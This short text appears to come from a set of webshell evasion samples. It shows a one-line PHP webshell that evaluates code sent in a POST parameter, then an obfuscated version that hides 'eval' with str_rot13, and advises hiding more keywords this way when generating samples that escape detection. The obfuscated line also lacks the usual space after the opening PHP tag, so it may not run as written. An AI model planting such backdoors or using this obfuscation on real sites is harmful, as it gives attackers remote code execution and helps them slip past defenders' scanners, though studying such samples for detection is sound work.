Original webshell sample:

'''
<?php @eval($_POST['110']);?>
'''

Webshell obtained after using the corresponding method:

'''
<?php$a=str_rot13('riny');$a($_POST['110']);?>
'''

Description:

The "eval" keyword in the original webshell is encrypted and hidden using the "str_rot13" character substitution encryption algorithm, and the "eval" function is called using the variable "$a". When generating escape samples, we can consider using str_rot13 to hide and encrypt more keywords.
